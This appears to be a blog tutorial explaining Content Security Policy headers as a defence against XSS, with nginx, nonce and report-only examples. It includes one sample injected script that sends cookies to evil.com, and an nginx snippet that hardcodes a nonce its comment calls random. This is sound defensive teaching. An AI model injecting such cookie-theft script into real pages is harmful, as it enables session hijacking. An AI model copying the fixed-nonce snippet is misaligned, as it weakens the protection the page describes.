---
title: "Content Security Policy: A Powerful Defense Against XSS"
date: 2018-11-27 10:19:48
tags:
  - Security
readingTime: 2
description: "Once CSP is configured, even if an XSS injection succeeds, the attacker cannot load or execute malicious external scripts."
wordCount: 187
---

Once CSP is configured, even if an XSS injection succeeds, the attacker cannot load or execute malicious external scripts.

## What Is CSP?

Content Security Policy is an HTTP response header that tells the browser which resources can be loaded and executed:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'
```

The browser will refuse to load any resource that doesn't match the policy, including inline scripts.

## Common Directives

```http
# Default policy (for all unspecified resource types)
default-src 'self'

# Script sources
script-src 'self' https://cdn.jsdelivr.net

# Style sources
style-src 'self' 'unsafe-inline'    # allow inline styles (sometimes unavoidable)

# Image sources
img-src 'self' data: https:        # data: allows base64; https: allows all HTTPS images

# Fonts
font-src 'self' https://fonts.gstatic.com

# AJAX/WebSocket requests
connect-src 'self' https://api.example.com wss://ws.example.com

# Prevent embedding in iframes (clickjacking protection)
frame-ancestors 'none'

# Report violations without blocking (for debugging)
report-uri /csp-violation-report
```

## Nginx Configuration

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## Handling Inline Scripts with Nonce

If you need inline scripts but don't want to use `unsafe-inline`, use a nonce:

```nginx
# Generate a random nonce for each request
set $nonce "xK2TnVqD8sP3mR7";
add_header Content-Security-Policy "script-src 'self' 'nonce-$nonce'";
```

```html
<!-- Only inline scripts with the correct nonce will execute -->
<script nonce="xK2TnVqD8sP3mR7">
  // This script is allowed
  var config = { apiUrl: "..." };
</script>

<!-- Attacker-injected scripts have no nonce — they won't execute -->
<script>
  fetch("https://evil.com?cookie=" + document.cookie);
</script>
```

## Start with Report-Only Mode

Enabling CSP directly may block legitimate functionality. Start with Report-Only mode to observe:

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

No blocking — violations are only sent as reports to `/csp-report` for debugging.

```javascript
// Receive CSP violation reports
app.post(
  "/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.log("CSP violation:", req.body);
    // Store in a logging system for analysis
    res.status(204).end();
  },
);
```

## Common CSP Compatibility Issues

- `eval()`: controlled by `unsafe-eval` in `script-src`; some Webpack configurations use it
- Inline event handlers: `<button onclick="...">` is blocked — switch to `addEventListener`
- `<base>` tag: affects relative URL resolution; controlled by `base-uri`

## Summary

- CSP is the last line of defense against XSS — even if a script is injected, it can't execute
- Start with `Report-Only` mode, collect violations, then enable full enforcement
- Nonce is more secure than `unsafe-inline`
- `frame-ancestors: none` also protects against clickjacking
